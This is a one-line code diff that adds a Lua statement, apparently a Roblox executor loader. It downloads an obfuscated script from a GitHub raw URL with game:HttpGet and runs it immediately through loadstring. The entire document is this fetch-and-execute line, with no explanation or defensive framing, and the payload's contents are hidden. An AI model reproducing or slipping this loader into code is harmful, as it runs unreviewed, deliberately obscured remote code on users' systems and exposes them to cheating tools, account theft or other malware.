@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/ravefrr/obfuscated/raw/main/obf_70A7CT7C2xp9P09ho592l4DxXzio5BfHbuCgbN112G6jsJ4k4kKOgUs6Xt0005U0.lua", true))() 
